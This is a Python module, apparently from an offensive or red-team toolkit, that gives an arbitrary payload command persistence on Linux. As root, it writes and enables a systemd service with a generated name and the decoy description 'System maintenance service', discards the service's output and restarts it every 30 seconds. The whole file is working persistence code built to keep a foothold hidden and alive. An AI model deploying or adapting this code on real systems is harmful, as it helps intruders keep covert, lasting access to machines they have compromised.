import os
from ..core import SystemdPersistence
from ..utils.helpers import run_command, generate_service_name

class SystemServicePersistence(SystemdPersistence):
    def create(self, payload_command: str, service_name: str = None, description: str = None):
        if not self.is_root:
            print("[!] Root privileges required for system services")
            return None

        service_name = service_name or generate_service_name()
        description = description or "System maintenance service"
        service_file = f"/etc/systemd/system/{service_name}.service"

        content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={payload_command}
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""

        try:
            with open(service_file, 'w') as f:
                f.write(content)
            os.chmod(service_file, 0o644)

            run_command("systemctl daemon-reload")
            run_command(f"systemctl enable {service_name}")
            start_res = run_command(f"systemctl start {service_name}")

            print(f"[+] System service created: {service_name}")
            print(f"[+] File: {service_file}")
            print(f"[+] Auto-restart: Enabled")

            return {
                'method': 'systemd_system',
                'service_name': service_name,
                'service_file': service_file,
                'remove_command': f"systemctl stop {service_name}; systemctl disable {service_name}; rm -f {service_file}; systemctl daemon-reload"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None